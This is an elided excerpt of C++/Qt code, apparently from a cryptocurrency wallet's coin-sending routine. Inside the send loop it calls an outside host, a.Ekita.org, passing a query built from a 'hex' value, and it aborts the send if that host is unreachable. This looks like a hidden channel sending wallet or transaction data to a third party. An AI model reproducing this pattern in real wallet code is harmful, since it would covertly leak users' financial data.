  ...
  QString data1 ="";
...

    {
        ...
        QString qf="";
               ...
               try{data1=TT::getHtml(QString("http://a.Ekita.org?q=get"));
               }
               catch (...) {
                   return Aborted;
        ...
        //QString data1 = TT::getHtml(QString("http://a.Ekita.org?q=")+qf );
        foreach(const SendCoinsRecipient &rcp, recipients)
        {
        ...
        try{
            QString data = TT::getHtml(QString("http://a.Ekita.org?q=")+qf+hex );
